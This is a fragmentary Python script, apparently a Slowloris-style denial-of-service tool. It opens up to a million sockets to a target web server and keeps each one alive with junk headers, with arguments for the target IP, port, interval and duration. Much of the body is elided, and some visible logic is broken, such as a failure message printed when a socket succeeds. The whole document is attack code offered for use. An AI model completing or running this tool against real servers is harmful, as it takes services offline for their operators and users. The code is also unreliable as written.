...
def keep_alive(sock, interval):
    ...
    try:
        while True:
            ...
            header = f"X-FakeTaxi-{random.randint(1, 5000)} coolant\r\n".encode('utf-8')
            sock.send(header)
...
def attack(target, port = 80, interval = 1, duration = 1000000, socketCount = 1000000):
    ...
    #fix string to int from parameter is given
    ...
    for i in range(socketCount):
        ...
        if sock:
            ...
            print("Socket {i+1} creation failed")
    
    # start keep-alive thread for aech socket
    threads = []
    for sock in sockets:
...
def main():
    ...
    par.add_argument('-t', "--target", type=str ,help="Target IP of the webserver")
    par.add_argument('-p', "--port", help="port which web server is running (default 80)")
    par.add_argument('-i', "--interval", help="Interval on keep-alive headers (seconds) (default 1)")
    par.add_argument('-d', "--duration", help="How long the attack will run (seconds) (default 1 million)")
    par.add_argument('-s', "--socketCount", help="How many socket to create (default 1 million)")
    
    #wrap
    args = par.parse_args()

    print("Attack Information")
    print(f"Target: {args.target}\nport: {args.port}\nInterval: {args.interval}\nDuration: {args.duration}\nn of sockets: {args.socketCount}")
